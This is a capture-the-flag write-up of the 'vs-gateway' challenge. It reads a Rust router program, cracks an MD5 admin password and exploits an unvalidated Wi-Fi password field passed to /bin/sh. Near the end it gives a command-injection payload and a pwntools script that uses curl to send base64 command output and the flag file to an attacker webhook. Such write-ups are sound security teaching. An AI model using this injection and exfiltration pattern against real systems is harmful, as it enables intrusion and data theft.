# vs-gateway \[471 Points] (63 Solves)
```
We are developing a new router but not sure if the interface has bug or not. Could you have a look?
```
Attached is [dist/](./dist)

---

## Writeup
`dist/main.rs`? \
Welp, it's time to read some Rust!

First, let's look at main
```rs
fn main() {
    println!("----------------------------");
    println!("|        VS Gateway        |");
    println!("----------------------------");

    if auth(){
        run();
    }
    process::exit(0);
}
```

Ok, so auth first
```rs
fn auth() -> bool{
    let mut username = String::new();
    let mut password = String::new();

    print!("Username: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut username).expect("Cannot read username!");

    print!("Password: ");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut password).expect("Cannot read username!");

    if username.trim() == "admin" && check_password(password){
        println!("Access granted!");
        true
    }
    else{
        println!("Access forbidden!");
        false
    }
}
```
The username must be admin and password...
```rs
fn check_password(password: String) -> bool{
    let digest = md5::compute(password.trim());
    if format!("{:x}", digest) == "e10adc3949ba59abbe56e057f20f883e" {
        true
    }
    else{
        false
    }
}
```
is hashed? Let's Google for the hash

![Search result for searching the hash showing `123456`](./images/google_hash.png)

Ok, so we can log in! _**But what's now?**_

Looking a bit through the code I found this
```rs
fn save_properties_to_file(){
    unsafe{
        let cmd = format!("echo \"{ESSID}\\n{BAND}\\n{CHANNEL}\\n{WIFI_PASSWORD}\" > /tmp/{ID}.conf");
        Command::new("/bin/sh")
                        .arg("-c")
                        .arg(cmd)
                        .output()
                        .expect("Failed to execute command");
    }
}
```
Wait, what's ESSID, BAND, etc?
```rs
pub static mut ESSID: String = String::new();
static BSSID: &str = "94:4e:6f:d7:bf:05";
static mut BAND: String = String::new();
static mut CHANNEL: i32 = 0;
static mut WIFI_PASSWORD: String = String::new();
static mut ID: u64 = 0;
```
Alright, they are global variables

Hmm, _**if we could control their value**_, especially of the ones with type `String`,
_we would be able to run shell commands!_

There's a menu which allows us to change the essid, band, chanel and password
```rs
fn menu(){
    println!("--- MENU ---------------------");
    println!("1. Show properties");
    println!("2. Change essid");
    println!("3. Change wifi band");
    println!("4. Change channel");
    println!("5. Change wifi password");
    println!("6. Exit");
    print!("> ");
    io::stdout().flush().unwrap();
}
```

Looking through the functions behind changing essid, band, we see that there's
**input validation** which won't let us do anything of interest. However if we look at password...
```rs
fn change_wifi_password(){
    let mut input: String = String::new();

    unsafe{
        println!("Current password: {WIFI_PASSWORD}");
        print!("New password: ");
        io::stdout().flush().unwrap();
        input.clear();
        io::stdin().read_line(&mut input).expect("Failed to readline");
        WIFI_PASSWORD = input.trim().to_owned();
        println!("Done!");
    }
    save_properties_to_file();
}
```
**It just sets it!** _Nothing is validated!_

We can break out of the `echo` string, and curl our website to see output of commands like ls and cat
for example
```bash
"; curl https://ATTACKER.COM/$(ls | base64); echo "
```
_We have to convert it to base64 (or url encode it) so the output can be correctly sent to the server via HTTP._

Using `ls`, we find that there's a file `/home/user/flag.txt`, so we can cat it!
```py
io = start()

io.sendlineafter("Username: ", "admin")
io.sendlineafter("Password: ", "123456")

io.sendlineafter("> ", "5") # Select change password option

ATTACKER = "https://webhook.site/your_webhook_here"
io.sendlineafter("New password: ", f'"; curl https://{ATTACKER}/$(cat /home/user/flag.txt | base64); echo "')

io.close()
```

[solve.py](./solve.py)

**Flag:** `vsctf{1s_1t_tru3_wh3n_rust_h4s_c0mm4nd_1nj3ct10n!??}`
